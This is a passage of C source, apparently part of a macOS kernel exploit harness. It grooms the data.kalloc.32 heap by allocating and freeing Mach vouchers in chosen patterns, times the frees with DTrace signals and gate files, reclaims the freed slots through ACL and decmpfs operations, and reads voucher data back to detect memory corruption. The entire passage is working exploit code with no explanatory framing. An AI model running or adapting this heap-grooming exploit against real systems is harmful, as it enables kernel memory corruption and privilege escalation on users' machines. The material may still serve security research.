    if (acl_target != NULL && acl_target[0] == '/') {
        char *basename;

        if (snprintf(acl_target_storage, sizeof(acl_target_storage), "%s",
            acl_target) >= (int)sizeof(acl_target_storage)) {
            fprintf(stderr, "VOUCHER32_ACL_TARGET is too long\n");
            return 2;
        }
        basename = strrchr(acl_target_storage, '/');
        if (basename != NULL && basename[1] != '\0') {
            *basename++ = '\0';
            if (chdir(acl_target_storage) == 0) {
                (void)access(".", X_OK);
                acl_access_target = basename;
                printf("voucher_acl_target_cwd=%s basename=%s\n",
                    acl_target_storage, acl_access_target);
            } else {
                perror("VOUCHER32_ACL_TARGET chdir");
                return 1;
            }
        }
    }
    (void)access("/dev/null", F_OK);
    result_socket = open_result_socket();
    vouchers = calloc(count, sizeof(*vouchers));
    if (vouchers == NULL) {
        return 1;
    }

    selective = strcmp(argv[2], "selective") == 0;
    pregroom = strcmp(argv[2], "pregroom") == 0 ||
        strcmp(argv[2], "pregroom3") == 0 || selective;
    if (pregroom) {
        unsigned survivors = 0;

        for (unsigned index = 0; index < count; index++) {
            kern_return_t result = create_voucher(base_index + index,
                fixed_payload, &vouchers[index]);

            if (result != KERN_SUCCESS) {
                fprintf(stderr, "create[%u]=0x%x\n", index, result);
                count = index;
                break;
            }
        }
        if (selective) {
            const char *prefix = getenv("VOUCHER32_SELECT_PREFIX");
            char gate[MAXPATHLEN];
            unsigned index_a[MAX_SELECTIONS];
            unsigned index_b[MAX_SELECTIONS];
            unsigned index_c[MAX_SELECTIONS];
            unsigned index_e[MAX_SELECTIONS];
            unsigned index_f[MAX_SELECTIONS];
            unsigned fdflags_e_slot = UINT_MAX;
            unsigned selection_count = 0;
            FILE *selection_file;
            const char *threaded_stage2_env =
                getenv("VOUCHER32_THREADED_STAGE2");
            const char *stage2_delay_env =
                getenv("VOUCHER32_STAGE2_DELAY_US");
            int threaded_stage2 = threaded_stage2_env != NULL &&
                strcmp(threaded_stage2_env, "1") == 0;
            useconds_t stage2_delay_us = 0;
            pthread_t stage2_threads[STAGE2_POLLER_THREADS];
            struct selective_stage2_context stage2_context = {0};
            sigset_t stage2_signal;

            if (stage2_delay_env != NULL && stage2_delay_env[0] != '\0') {
                char *end = NULL;
                unsigned long value;

                errno = 0;
                value = strtoul(stage2_delay_env, &end, 10);
                if (errno != 0 || end == stage2_delay_env || *end != '\0' ||
                    value > 1000000) {
                    fprintf(stderr, "invalid VOUCHER32_STAGE2_DELAY_US=%s\n",
                        stage2_delay_env);
                    return 2;
                }
                stage2_delay_us = (useconds_t)value;
            }
            if (prefix == NULL || prefix[0] == '\0' ||
                snprintf(gate, sizeof(gate), "%s.%d", prefix, getpid()) >=
                (int)sizeof(gate)) {
                fprintf(stderr, "invalid VOUCHER32_SELECT_PREFIX\n");
                return 2;
            }
            if (signal(SIGUSR1, handle_dtrace_release) == SIG_ERR) {
                perror("signal");
                return 1;
            }
            if (signal(SIGUSR2, handle_dtrace_stage2) == SIG_ERR) {
                perror("signal");
                return 1;
            }
            if (signal(SIGURG, handle_dtrace_stage2_prefree) == SIG_ERR) {
                perror("signal");
                return 1;
            }
            if (fdflags_target && !fdflags_prefork &&
                spawn_fdflags_victim() < 0) {
                return 1;
            }
            printf("%s count=%u pid=%d gate=%s\n",
                fdflags_prefork ?
                "voucher_selective_prefork_prearmed" :
                "voucher_selective_prearmed",
                count, getpid(), gate);
            fflush(stdout);
            while (!dtrace_release_requested) {
                (void)syscall(SYS_getpid);
                usleep(1000);
            }
            selection_file = fopen(gate, "r");
            if (selection_file == NULL) {
                perror("selection open");
                return 1;
            }
            while (selection_count < MAX_SELECTIONS) {
                int fields;

                if (fdflags_target && fdflags_prefork) {
                    fields = fscanf(selection_file, "%u %u %u %u %u",
                        &index_a[selection_count],
                        &index_b[selection_count],
                        &index_c[selection_count],
                        &index_e[selection_count],
                        &index_f[selection_count]);
                    if (fields != 5) {
                        break;
                    }
                } else if (fdflags_target) {
                    fields = fscanf(selection_file, "%u %u %u %u",
                        &index_a[selection_count],
                        &index_b[selection_count],
                        &index_c[selection_count],
                        &index_e[selection_count]);
                    if (fields != 4) {
                        break;
                    }
                    index_f[selection_count] = UINT_MAX;
                } else {
                    fields = fscanf(selection_file, "%u %u %u",
                        &index_a[selection_count],
                        &index_b[selection_count],
                        &index_c[selection_count]);
                    if (fields != 3) {
                        break;
                    }
                    index_e[selection_count] = UINT_MAX;
                    index_f[selection_count] = UINT_MAX;
                }
                unsigned slot = selection_count;
                int invalid = index_a[slot] >= count ||
                    index_b[slot] >= count || index_c[slot] >= count ||
                    index_a[slot] == index_b[slot] ||
                    index_a[slot] == index_c[slot] ||
                    index_b[slot] == index_c[slot] ||
                    (fdflags_target &&
                    (index_e[slot] >= count ||
                    index_e[slot] == index_a[slot] ||
                    index_e[slot] == index_b[slot] ||
                    index_e[slot] == index_c[slot])) ||
                    (fdflags_prefork &&
                    (index_f[slot] >= count ||
                    index_f[slot] == index_a[slot] ||
                    index_f[slot] == index_b[slot] ||
                    index_f[slot] == index_c[slot] ||
                    index_f[slot] == index_e[slot]));

                for (unsigned prior = 0; prior < slot && !invalid;
                    prior++) {
                    invalid =
                        index_a[slot] == index_a[prior] ||
                        index_a[slot] == index_b[prior] ||
                        index_a[slot] == index_c[prior] ||
                        index_b[slot] == index_a[prior] ||
                        index_b[slot] == index_b[prior] ||
                        index_b[slot] == index_c[prior] ||
                        index_c[slot] == index_a[prior] ||
                        index_c[slot] == index_b[prior] ||
                        index_c[slot] == index_c[prior] ||
                        (fdflags_target &&
                        (index_e[slot] == index_a[prior] ||
                        index_e[slot] == index_b[prior] ||
                        index_e[slot] == index_c[prior] ||
                        index_e[slot] == index_e[prior] ||
                        index_a[slot] == index_e[prior] ||
                        index_b[slot] == index_e[prior] ||
                        index_c[slot] == index_e[prior])) ||
                        (fdflags_prefork &&
                        (index_f[slot] == index_a[prior] ||
                        index_f[slot] == index_b[prior] ||
                        index_f[slot] == index_c[prior] ||
                        index_f[slot] == index_e[prior] ||
                        index_f[slot] == index_f[prior] ||
                        index_a[slot] == index_f[prior] ||
                        index_b[slot] == index_f[prior] ||
                        index_c[slot] == index_f[prior] ||
                        index_e[slot] == index_f[prior]));
                }
                if (invalid) {
                    fprintf(stderr,
                        "invalid overlapping selection: %u %u %u %u %u\n",
                        index_a[slot], index_b[slot], index_c[slot],
                        index_e[slot], index_f[slot]);
                    fclose(selection_file);
                    return 1;
                }
                selection_count++;
            }
            if (ferror(selection_file) || selection_count == 0) {
                fprintf(stderr, "selection read failed\n");
                fclose(selection_file);
                return 1;
            }
            fclose(selection_file);
            if (fdflags_prefork) {
                char fdslot_gate[MAXPATHLEN];
                FILE *fdslot_file;

                for (unsigned slot = 0; slot < selection_count; slot++) {
                    mach_port_deallocate(mach_task_self(),
                        vouchers[index_f[slot]]);
                    vouchers[index_f[slot]] = MACH_PORT_NULL;
                    printf("voucher_fdflags_prefork_hole pid=%d slot=%u "
                        "e=%u f=%u\n", getpid(), slot, index_e[slot],
                        index_f[slot]);
                }
                fflush(stdout);
                if (spawn_fdflags_victim() < 0) {
                    return 1;
                }
                if (snprintf(fdslot_gate, sizeof(fdslot_gate), "%s.fdslot",
                    gate) >= (int)sizeof(fdslot_gate)) {
                    fprintf(stderr, "fdflags slot gate is too long\n");
                    return 1;
                }
                printf("voucher_fdflags_spawned_wait pid=%d gate=%s\n",
                    getpid(), fdslot_gate);
                fflush(stdout);
                for (unsigned polls = 0; polls < 400000U; polls++) {
                    if (access(fdslot_gate, F_OK) == 0) {
                        break;
                    }
                    usleep(100);
                }
                fdslot_file = fopen(fdslot_gate, "r");
                if (fdslot_file == NULL ||
                    fscanf(fdslot_file, "%u", &fdflags_e_slot) != 1 ||
                    fdflags_e_slot >= selection_count) {
                    fprintf(stderr, "invalid fdflags destination slot\n");
                    if (fdslot_file != NULL) {
                        fclose(fdslot_file);
                    }
                    return 1;
                }
                fclose(fdslot_file);
                printf("voucher_fdflags_placement_ready pid=%d "
                    "e_slot=%u e=%u\n", getpid(), fdflags_e_slot,
                    index_e[fdflags_e_slot]);
                fflush(stdout);
                dtrace_release_requested = 0;
                printf("voucher_selective_prearmed count=%u pid=%d "
                    "gate=%s prefork=1\n", count, getpid(), gate);
                fflush(stdout);
                while (!dtrace_release_requested) {
                    (void)syscall(SYS_getpid);
                    usleep(1000);
                }
            }
            if (stage2_delay_us != 0 && selection_count != 1) {
                fprintf(stderr,
                    "timed stage2 requires exactly one selection, got %u\n",
                    selection_count);
                return 1;
            }
            /*
             * Open the prepared minimal Type-1 file while A/B/C are all
             * still live. Opening after A is freed can consume the exact A
             * hole that the MIC allocation is supposed to reclaim.
             */
            if (decmpfs_read_size != 0) {
                decmpfs_fd = open(decmpfs_target, O_RDONLY);
                if (decmpfs_fd < 0) {
                    perror("decmpfs open");
                    return 1;
                }
                (void)fcntl(decmpfs_fd, F_NOCACHE, 1);
                printf("voucher_decmpfs_prearmed pid=%d path=%s size=%zu\n",
                    getpid(), decmpfs_target, decmpfs_read_size);
                fflush(stdout);
            }
            if (threaded_stage2) {
                sigemptyset(&stage2_signal);
                sigaddset(&stage2_signal, SIGUSR2);
                sigaddset(&stage2_signal, SIGURG);
                if (pthread_sigmask(SIG_BLOCK, &stage2_signal, NULL) != 0) {
                    perror("pthread_sigmask stage2");
                    return 1;
                }
                stage2_context = (struct selective_stage2_context){
                    .vouchers = vouchers,
                    .index_b = index_b,
                    .index_c = index_c,
                    .index_e = fdflags_target ? index_e : NULL,
                    .fdflags_e_slot = fdflags_e_slot,
                    .selection_count = selection_count,
                    .count = count,
                    .delay_us = stage2_delay_us,
                    .acl_target = acl_target,
                    .acl_access_target = acl_access_target,
                    .acl_operation = acl_operation,
                    .tight_acl_reclaim = tight_acl_reclaim,
                    .tight_drain_count = tight_drain_count,
                    .tight_bounce_count = tight_bounce_count,
                    .tight_sacrifice_count = tight_sacrifice_count,
                    .result_socket = result_socket,
                    .decmpfs_fd = decmpfs_fd,
                    .decmpfs_buffer = decmpfs_buffer,
                    .decmpfs_read_size = decmpfs_read_size,
                    .decmpfs_target = decmpfs_target,
                };
                for (unsigned thread_index = 0;
                    thread_index < STAGE2_POLLER_THREADS; thread_index++) {
                    if (pthread_create(&stage2_threads[thread_index], NULL,
                        run_selective_stage2, &stage2_context) != 0) {
                        perror("pthread_create stage2");
                        return 1;
                    }
                }
                printf("voucher_selective_stage2_thread_ready pid=%d "
                    "pollers=%u delay_us=%u monotonic_ns=%llu\n", getpid(),
                    STAGE2_POLLER_THREADS, (unsigned)stage2_delay_us,
                    (unsigned long long)monotonic_ns());
                fflush(stdout);
            }
            for (unsigned slot = 0; slot < selection_count; slot++) {
                mach_port_deallocate(mach_task_self(),
                    vouchers[index_a[slot]]);
                vouchers[index_a[slot]] = MACH_PORT_NULL;
            }
            printf("voucher_selective_stage1 count=%u pid=%d selections=%u "
                "monotonic_ns=%llu\n", count, getpid(), selection_count,
                (unsigned long long)monotonic_ns());
            fflush(stdout);
            if (threaded_stage2) {
                for (unsigned thread_index = 0;
                    thread_index < STAGE2_POLLER_THREADS; thread_index++) {
                    if (pthread_join(stage2_threads[thread_index],
                        NULL) != 0) {
                        fprintf(stderr, "threaded stage2 join failed\n");
                        return 1;
                    }
                }
                if (!dtrace_stage2_worker_done) {
                    fprintf(stderr, "threaded stage2 failed\n");
                    return 1;
                }
                for (;;) {
                    pause();
                }
            }
            while (!dtrace_stage2_requested) {
                for (unsigned slot = 0;
                    slot < selection_count && !dtrace_stage2_requested;
                    slot++) {
                    dtrace_stage2_probe_slot_plus1 =
                        (sig_atomic_t)(slot + 1);
                    (void)syscall(SYS_getpgid,
                        (pid_t)(0x6a00 + slot + 1));
                }
                if (!dtrace_stage2_requested) {
                    (void)syscall(SYS_getpid);
                }
                usleep(100);
            }
            unsigned first_b_slot = 0;
            unsigned last_b_slot = selection_count;

            if (dtrace_stage2_slot_plus1 != 0) {
                first_b_slot =
                    (unsigned)dtrace_stage2_slot_plus1 - 1;
                if (first_b_slot >= selection_count) {
                    fprintf(stderr,
                        "targeted stage2 slot out of range: %u/%u\n",
                        first_b_slot, selection_count);
                    return 1;
                }
                last_b_slot = first_b_slot + 1;
                printf("voucher_selective_stage2_targeted pid=%d slot=%u b=%u probe=0x%x\n",
                    getpid(), first_b_slot, index_b[first_b_slot],
                    0x6a00 + first_b_slot + 1);
            } else {
                printf("voucher_selective_stage2_legacy pid=%d selections=%u\n",
                    getpid(), selection_count);
            }
            for (unsigned slot = first_b_slot; slot < last_b_slot; slot++) {
                if (fdflags_target) {
                    unsigned e_slot =
                        fdflags_e_slot < selection_count ?
                        fdflags_e_slot : slot;

                    mach_port_deallocate(mach_task_self(),
                        vouchers[index_e[e_slot]]);
                    vouchers[index_e[e_slot]] = MACH_PORT_NULL;
                }
                mach_port_deallocate(mach_task_self(),
                    vouchers[index_b[slot]]);
                vouchers[index_b[slot]] = MACH_PORT_NULL;
            }
            /*
             * This is deliberately the first syscall after freeing B. The
             * selected helper therefore asks data.kalloc.32 for the
             * synthesized 20-byte header on the same thread/magazine that
             * just returned B. DTrace must hold at the Type-1 callback entry,
             * after attr_size has been initialized to 0x10.
             */
            if (decmpfs_fd >= 0) {
                ssize_t read_result;
                int read_errno;

                errno = 0;
                read_result = pread(decmpfs_fd, decmpfs_buffer,
                    decmpfs_read_size, 0);
                read_errno = errno;
                printf("voucher_selective_decmpfs result=%zd errno=%d "
                    "requested=%zu path=%s data_hex=",
                    read_result, read_errno, decmpfs_read_size,
                    decmpfs_target);
                if (read_result > 0) {
                    print_hex(decmpfs_buffer, (size_t)read_result);
                }
                printf("\n");
                fflush(stdout);
            }
            perform_acl_operation(acl_target, acl_access_target,
                acl_operation, result_socket);
            printf("voucher_selective_ready count=%u pid=%d selections=%u\n",
                count, getpid(), selection_count);
            fflush(stdout);
            if (fsync(STDOUT_FILENO) != 0) {
                perror("voucher result fsync");
            }
            for (;;) {
                pause();
            }
        } else if (strcmp(argv[2], "pregroom3") == 0) {
            /*
             * Free B then A in each [A, B, C] run. A LIFO magazine should
             * then serve A to the MIC, B to the ACL, and leave the valid
             * ACE carrier C live at MIC+64.
             */
            for (unsigned index = 0; index + 2 < count; index += 3) {
                mach_port_deallocate(mach_task_self(),
                    vouchers[index + 1]);
                vouchers[index + 1] = MACH_PORT_NULL;
                mach_port_deallocate(mach_task_self(), vouchers[index]);
                vouchers[index] = MACH_PORT_NULL;
            }
        } else {
            for (unsigned index = 0; index < count; index += 2) {
                mach_port_deallocate(mach_task_self(), vouchers[index]);
                vouchers[index] = MACH_PORT_NULL;
            }
        }
        for (unsigned index = 0; index < count; index++) {
            survivors += vouchers[index] != MACH_PORT_NULL;
        }
        printf("voucher_pregroomed count=%u survivors=%u base=%u mode=%s\n",
            count, survivors, base_index, argv[2]);
        fflush(stdout);
        if (wait_for_release_signal(count, argv[2]) < 0) {
            for (unsigned index = 0; index < count; index++) {
                if (vouchers[index] != MACH_PORT_NULL) {
                    mach_port_deallocate(mach_task_self(), vouchers[index]);
                }
            }
            free(vouchers);
            return 1;
        }
    } else if (strcmp(argv[2], "signal") == 0 ||
        strcmp(argv[2], "dtrace_signal") == 0) {
        if (wait_for_release_signal(count, argv[2]) < 0) {
            free(vouchers);
            return 1;
        }
    } else {
        printf("voucher_prearmed count=%u file=%s\n", count, argv[2]);
        fflush(stdout);
        for (unsigned polls = 0; polls < 1200000U; polls++) {
            if (access(argv[2], F_OK) == 0) {
                break;
            }
            if (polls == 1199999U) {
                fprintf(stderr, "release timeout\n");
                free(vouchers);
                return 1;
            }
            usleep(100);
        }
    }

    if (!pregroom) {
        for (unsigned index = 0; index < count; index++) {
            kern_return_t result = create_voucher(base_index + index,
                fixed_payload, &vouchers[index]);

            if (result != KERN_SUCCESS) {
                fprintf(stderr, "create[%u]=0x%x\n", index, result);
                count = index;
                break;
            }
        }
        printf("voucher_allocated count=%u\n", count);
        fflush(stdout);
    }

    usleep(900000);
    for (unsigned index = 0; index < count; index++) {
        struct user_data_recipe output = {0};
        uint8_t expected[VOUCHER_DATA_SIZE];
        mach_msg_type_number_t output_size = sizeof(output);
        kern_return_t result;

        if (vouchers[index] == MACH_PORT_NULL) {
            continue;
        }
        fill_data(expected, base_index + index, fixed_payload);
        result = mach_voucher_extract_attr_recipe(vouchers[index],
            MACH_VOUCHER_ATTR_KEY_USER_DATA,
            (mach_voucher_attr_raw_recipe_t)&output, &output_size);
        if (result != KERN_SUCCESS || output_size != sizeof(output)) {
            fprintf(stderr, "extract[%u]=0x%x size=%u\n",
                index, result, output_size);
            continue;
        }
        if (memcmp(output.data, expected, sizeof(expected)) != 0) {
            uint32_t before;
            uint32_t after;

            memcpy(&before, expected, sizeof(before));
            memcpy(&after, output.data, sizeof(after));
            printf("VOUCHER_CHANGED index=%u before=0x%08x after=0x%08x\n",
                base_index + index, before, after);
            changed++;
        }
    }
    printf("voucher_oracle_done count=%u changed=%u\n", count, changed);
    fflush(stdout);

    for (unsigned index = 0; index < count; index++) {
        if (vouchers[index] != MACH_PORT_NULL) {
            mach_port_deallocate(mach_task_self(), vouchers[index]);
        }
    }
    free(vouchers);
    return 0;
}
